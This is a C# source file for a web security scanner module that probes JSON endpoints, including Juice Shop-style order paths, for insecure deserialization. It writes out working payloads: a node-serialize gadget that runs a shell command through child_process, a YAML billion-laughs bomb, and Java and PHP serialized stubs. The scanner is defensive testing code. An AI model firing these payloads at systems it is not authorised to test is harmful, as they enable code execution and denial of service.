using System.Diagnostics;
using System.Text.Json;
using Trowser.Automation;

namespace Trowser.Security;

/// <summary>
/// Insecure deserialization probes (Node gadget, YAML bomb, Java/PHP stubs) against JSON/body sinks.
/// Critical RCE requires gadget residue and/or strong time delta vs baseline — not generic body substrings.
/// Inspired by the OWASP Deserialization Cheat Sheet; also influenced by pentest-ai <c>web.deserialization</c>.
/// Warning: sleep/exec gadgets and YAML bombs can stress targets; active safetyMode only.
/// </summary>
public sealed class DeserializationScanProbe
{
    private readonly AutomationContext _ctx;
    private readonly Action<string, string> _log;

    private const double RceTimeDeltaS = 3.0;
    private const double DosTimeS = 5.0;
    private const double BaselineSlowCutoffS = 3.0;

    private static readonly string[] RceBodyMarkers =
    [
        "ReferenceError", "process.exit", "child_process", "_$$ND_FUNC$$_"
    ];

    private static readonly string[] DosBodyMarkers =
    [
        "out of memory", "JavaScript heap", "RangeError", "Maximum call stack",
        "YAMLException", "parser error"
    ];

    private static readonly string[] FixedSinkPaths =
    [
        "/b2b/v2/orders", "/api/orders", "/api/serialize", "/api/deserialize", "/api/parse"
    ];

    public DeserializationScanProbe(AutomationContext context, Action<string, string> log)
    {
        _ctx = context;
        _log = log;
    }

    public sealed class DeserializationScanOptions
    {
        public int MaxCandidates { get; set; } = 8;
        public int TimeoutMs { get; set; } = 15000;
        public bool IncludeJavaStub { get; set; } = true;
        public bool IncludePhpStub { get; set; } = true;
        public bool IncludeBrowserCookies { get; set; } = true;

        /// <summary>When false, only JSON endpoints from traffic are probed (no fixed Juice Shop-style paths).</summary>
        public bool IncludeFixedSinks { get; set; } = true;
    }

    public sealed class DeserializationFinding
    {
        public string Category { get; init; } = "";
        public string Severity { get; init; } = "high";
        public string Signal { get; init; } = "";
        public string Url { get; init; } = "";
        public string Method { get; init; } = "POST";
        public string Variant { get; init; } = "";
        public int Status { get; init; }
        public string Detail { get; init; } = "";
    }

    public sealed class DeserializationScanResult
    {
        public string Message { get; init; } = "";
        public int CandidatesProbed { get; init; }
        public int ProbesSent { get; init; }
        public int ElapsedMs { get; init; }
        public List<DeserializationFinding> Findings { get; init; } = [];
        public bool HasFindings => Findings.Count > 0;
    }

    public async Task<DeserializationScanResult> RunAsync(DeserializationScanOptions options, CancellationToken ct = default)
    {
        var sw = Stopwatch.StartNew();
        var currentUrl = await _ctx.GetCurrentUrl();
        if (string.IsNullOrEmpty(currentUrl) || !Uri.TryCreate(currentUrl, UriKind.Absolute, out var currentUri))
            throw new InvalidOperationException("Navigate to a page before running deserialization-scan.");

        var origin = currentUri.GetLeftPart(UriPartial.Authority);
        var sinks = BuildSinks(origin, options);
        if (sinks.Count == 0)
        {
            return new DeserializationScanResult
            {
                Message = "No deserialization sink candidates. Browse the app or increase maxCandidates.",
                ElapsedMs = (int)sw.ElapsedMilliseconds
            };
        }

        var findings = new List<DeserializationFinding>();
        var probesSent = 0;
        var headers = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase)
        {
            ["Content-Type"] = "application/json"
        };

        _log($"DeserializationScan: {sinks.Count} sink(s)", "#888888");

        foreach (var sink in sinks)
        {
            ct.ThrowIfCancellationRequested();
            var timeout = Math.Max(options.TimeoutMs, 6000);

            var baselineBody = sink.BaselineBody;
            var baseline = await SecurityProbeHttp.FetchTimedAsync(
                _ctx, sink.Url, "POST", headers, baselineBody, timeout, options.IncludeBrowserCookies, ct);
            probesSent++;
            if (UploadProbeSupport.EndpointAbsent(baseline.Result.Status))
                continue;

            var baselineSlow = baseline.ElapsedSeconds >= BaselineSlowCutoffS;

            // Node-serialize RCE gadget
            var rceBody = sink.BuildRceBody();
            var rce = await SecurityProbeHttp.FetchTimedAsync(
                _ctx, sink.Url, "POST", headers, rceBody, timeout, options.IncludeBrowserCookies, ct);
            probesSent++;
            if (!UploadProbeSupport.EndpointAbsent(rce.Result.Status))
            {
                var timeSignal = !baselineSlow && (rce.ElapsedSeconds - baseline.ElapsedSeconds) >= RceTimeDeltaS;
                var bodySignal = HasMarker(rce.Result.Body, RceBodyMarkers);
                if (timeSignal && !bodySignal)
                {
                    timeSignal = await SecurityProbeTimingConfirm.ConfirmDeltaAsync(
                        async ct2 => (await SecurityProbeHttp.FetchTimedAsync(
                            _ctx, sink.Url, "POST", headers, baselineBody, timeout, options.IncludeBrowserCookies, ct2)).ElapsedSeconds,
                        async ct2 => (await SecurityProbeHttp.FetchTimedAsync(
                            _ctx, sink.Url, "POST", headers, rceBody, timeout, options.IncludeBrowserCookies, ct2)).ElapsedSeconds,
                        (b, a) => !baselineSlow && a - b >= RceTimeDeltaS,
                        ct);
                    probesSent += 2;
                }

                if (timeSignal || bodySignal)
                {
                    var severity = bodySignal ? "critical" : "high";
                    findings.Add(MakeFinding("rce-deserialization", severity, "node-serialize-rce",
                        sink.Url, "node-serialize-gadget", rce.Result.Status,
                        $"baseline={baseline.ElapsedSeconds:F2}s attack={rce.ElapsedSeconds:F2}s status={rce.Result.Status} body={Truncate(rce.Result.Body, 160)}"));
                    _log($"  FLAG node-serialize RCE: {sink.Url}", "#F44747");
                    continue;
                }
            }

            // YAML billion-laughs DoS
            var dosBody = sink.BuildDosBody();
            var dos = await SecurityProbeHttp.FetchTimedAsync(
                _ctx, sink.Url, "POST", headers, dosBody, timeout, options.IncludeBrowserCookies, ct);
            probesSent++;
            if (!UploadProbeSupport.EndpointAbsent(dos.Result.Status))
            {
                var timeSignal = !baselineSlow && (dos.ElapsedSeconds - baseline.ElapsedSeconds) >= DosTimeS;
                if (timeSignal)
                {
                    timeSignal = await SecurityProbeTimingConfirm.ConfirmDeltaAsync(
                        async ct2 => (await SecurityProbeHttp.FetchTimedAsync(
                            _ctx, sink.Url, "POST", headers, baselineBody, timeout, options.IncludeBrowserCookies, ct2)).ElapsedSeconds,
                        async ct2 => (await SecurityProbeHttp.FetchTimedAsync(
                            _ctx, sink.Url, "POST", headers, dosBody, timeout, options.IncludeBrowserCookies, ct2)).ElapsedSeconds,
                        (b, a) => !baselineSlow && a - b >= DosTimeS,
                        ct);
                    probesSent += 2;
                }

                var statusSignal = dos.Result.Status is 500 or 503 && HasMarker(dos.Result.Body, DosBodyMarkers);
                if (timeSignal || statusSignal)
                {
                    findings.Add(MakeFinding("deserialization-dos", "high", "yaml-billion-laughs",
                        sink.Url, "yaml-dos", dos.Result.Status,
                        $"baseline={baseline.ElapsedSeconds:F2}s attack={dos.ElapsedSeconds:F2}s status={dos.Result.Status}"));
                    _log($"  FLAG deserialization DoS: {sink.Url}", "#F44747");
                }
            }

            if (options.IncludeJavaStub)
            {
                probesSent += await ProbeJavaStubAsync(sink, options, timeout, findings, ct);
            }

            if (options.IncludePhpStub)
            {
                probesSent += await ProbePhpStubAsync(sink, options, timeout, findings, ct);
            }
        }

        return new DeserializationScanResult
        {
            Message = findings.Count > 0
                ? $"{findings.Count} deserialization finding(s) across {sinks.Count} sink(s)."
                : $"No deserialization indicators across {sinks.Count} sink(s), {probesSent} probe(s).",
            CandidatesProbed = sinks.Count,
            ProbesSent = probesSent,
            Findings = findings,
            ElapsedMs = (int)sw.ElapsedMilliseconds
        };
    }

    private async Task<int> ProbeJavaStubAsync(
        DeserializationSink sink,
        DeserializationScanOptions options,
        int timeout,
        List<DeserializationFinding> findings,
        CancellationToken ct)
    {
        var javaHeaders = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase)
        {
            ["Content-Type"] = "application/x-java-serialized-object"
        };
        var javaBody = Convert.ToBase64String([0xAC, 0xED, 0x00, 0x05, 0x73, 0x72, 0x00, 0x10]);
        var probe = await SecurityProbeHttp.FetchTimedAsync(
            _ctx, sink.Url, "POST", javaHeaders, javaBody, timeout, options.IncludeBrowserCookies, ct);

        if (probe.Result.Status is >= 200 and < 300 or >= 500)
        {
            // Require Java-specific deserialize evidence. Generic Node/Express stack traces
            // (TypeError, SyntaxError, "at Object.") must not raise java-serialized-accepted.
            if (HasJavaDeserializeEvidence(probe.Result.Body))
            {
                findings.Add(MakeFinding("deserialization-suspected", "high", "java-serialized-accepted",
                    sink.Url, "java-magic-bytes", probe.Result.Status,
                    $"Java serialized Content-Type accepted; HTTP {probe.Result.Status} with Java deserializer indicators."));
                _log($"  FLAG java-serialized: {sink.Url}", "#F44747");
            }
        }

        return 1;
    }

    private static bool HasJavaDeserializeEvidence(string body)
    {
        if (string.IsNullOrEmpty(body)) return false;
        return body.Contains("ObjectInputStream", StringComparison.OrdinalIgnoreCase)
               || body.Contains("InvalidClassException", StringComparison.OrdinalIgnoreCase)
               || body.Contains("StreamCorruptedException", StringComparison.OrdinalIgnoreCase)
               || body.Contains("java.io.Serializable", StringComparison.OrdinalIgnoreCase)
               || (body.Contains("java.lang.", StringComparison.OrdinalIgnoreCase)
                   && (body.Contains("serialize", StringComparison.OrdinalIgnoreCase)
                       || body.Contains("ObjectInput", StringComparison.OrdinalIgnoreCase)));
    }

    private async Task<int> ProbePhpStubAsync(
        DeserializationSink sink,
        DeserializationScanOptions options,
        int timeout,
        List<DeserializationFinding> findings,
        CancellationToken ct)
    {
        var phpPayload = sink.BuildPhpBody();
        var headers = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase)
        {
            ["Content-Type"] = "application/json"
        };
        var probe = await SecurityProbeHttp.FetchTimedAsync(
            _ctx, sink.Url, "POST", headers, phpPayload, timeout, options.IncludeBrowserCookies, ct);

        if (probe.Result.Body.Contains("stdClass", StringComparison.OrdinalIgnoreCase)
            && (probe.Result.Body.Contains("unserialize", StringComparison.OrdinalIgnoreCase)
                || probe.Result.Body.Contains("PHP Fatal", StringComparison.OrdinalIgnoreCase)
                || probe.Result.Body.Contains("allowed_classes", StringComparison.OrdinalIgnoreCase)))
        {
            findings.Add(MakeFinding("deserialization-suspected", "high", "php-unserialize-indicator",
                sink.Url, "php-serialized-field", probe.Result.Status,
                "PHP unserialize indicators in response after O:8:\"stdClass\" payload."));
            _log($"  FLAG php unserialize: {sink.Url}", "#F44747");
        }

        return 1;
    }

    private List<DeserializationSink> BuildSinks(string origin, DeserializationScanOptions options)
    {
        var sinks = new List<DeserializationSink>();
        var seen = new HashSet<string>(StringComparer.OrdinalIgnoreCase);

        if (options.IncludeFixedSinks)
        {
            foreach (var path in FixedSinkPaths)
            {
                var url = origin.TrimEnd('/') + path;
                if (seen.Add(url))
                    sinks.Add(DeserializationSink.ForJuiceShopStyle(url));
            }
        }

        foreach (var pt in InjectionPointDiscovery.DiscoverJsonEndpoints(_ctx, origin, options.MaxCandidates))
        {
            if (!seen.Add(pt.Url)) continue;
            sinks.Add(DeserializationSink.ForJsonEndpoint(pt.Url, pt.BodyTemplate ?? "{}"));
        }

        return sinks.Take(Math.Max(1, options.MaxCandidates)).ToList();
    }

    private static DeserializationFinding MakeFinding(
        string category, string severity, string signal, string url, string variant, int status, string detail) =>
        new()
        {
            Category = category,
            Severity = severity,
            Signal = signal,
            Url = url,
            Variant = variant,
            Status = status,
            Detail = detail
        };

    private static bool HasMarker(string text, IEnumerable<string> markers) =>
        !string.IsNullOrEmpty(text) && markers.Any(m => text.Contains(m, StringComparison.OrdinalIgnoreCase));

    private static string Truncate(string s, int max) =>
        s.Length <= max ? s : s[..max] + "…";

    private sealed class DeserializationSink
    {
        public string Url { get; init; } = "";
        public string BaselineBody { get; init; } = "{}";
        public bool JuiceShopShape { get; init; }

        public static DeserializationSink ForJuiceShopStyle(string url) => new()
        {
            Url = url,
            BaselineBody = """{"orderLinesData":"simple"}""",
            JuiceShopShape = true
        };

        public static DeserializationSink ForJsonEndpoint(string url, string bodyTemplate)
        {
            var baseline = bodyTemplate;
            try
            {
                using var doc = JsonDocument.Parse(bodyTemplate);
                if (doc.RootElement.ValueKind == JsonValueKind.Object)
                    baseline = bodyTemplate;
            }
            catch
            {
                baseline = "{}";
            }

            return new DeserializationSink { Url = url, BaselineBody = baseline, JuiceShopShape = false };
        }

        public string BuildRceBody()
        {
            const string gadget =
                "[{\"_$$ND_FUNC$$_\":\"function(){require(\\\"child_process\\\").exec(\\\"sleep 3\\\", function(){})}()\"}]";
            return JuiceShopShape
                ? "{\"orderLinesData\":" + JsonSerializer.Serialize(gadget) + "}"
                : "{\"data\":" + JsonSerializer.Serialize(gadget) + ",\"payload\":" + JsonSerializer.Serialize(gadget) + "}";
        }

        public string BuildDosBody()
        {
            const string bomb =
                "a: &a [1,2,3]\nb: &b [*a, *a, *a]\nc: &c [*b, *b, *b]\nd: &d [*c, *c, *c]\ne: &e [*d, *d, *d]\nf: &f [*e, *e, *e]\n";
            return JuiceShopShape
                ? "{\"orderLinesData\":" + JsonSerializer.Serialize(bomb) + "}"
                : "{\"data\":" + JsonSerializer.Serialize(bomb) + "}";
        }

        public string BuildPhpBody()
        {
            const string php = "O:8:\"stdClass\":0:{}";
            return JuiceShopShape
                ? "{\"orderLinesData\":" + JsonSerializer.Serialize(php) + "}"
                : "{\"data\":" + JsonSerializer.Serialize(php) + ",\"serialized\":" + JsonSerializer.Serialize(php) + "}";
        }
    }
}
